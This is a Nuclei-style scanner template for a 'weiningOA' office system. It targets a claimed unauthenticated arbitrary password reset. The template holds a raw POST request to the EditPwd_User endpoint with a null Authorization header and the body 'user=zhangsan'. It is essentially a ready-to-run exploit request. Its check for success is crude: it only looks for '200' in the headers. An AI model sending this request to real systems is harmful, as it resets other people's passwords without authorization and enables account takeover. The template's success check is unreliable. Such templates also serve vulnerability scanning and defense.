id: weiningOA-EditPwd_User-restpasswd
info:
  name: weiningOA-EditPwd_User-mimachongzhi
  author: apple
  severity: high
  description: 存在前台任意密码重置。具体完整数据包看本文件。
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |-
        POST /OAMenu/Login/EditPwd_User HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Authorization: null
        X-Requested-With: XMLHttpRequest
        Origin: http://{{Hostname}}
        Connection: close
        Referer: http://{{Hostname}}/
        Content-Length: 13

        user=zhangsan
    matchers:
      - type: word
        part: header
        words:
          - '200'
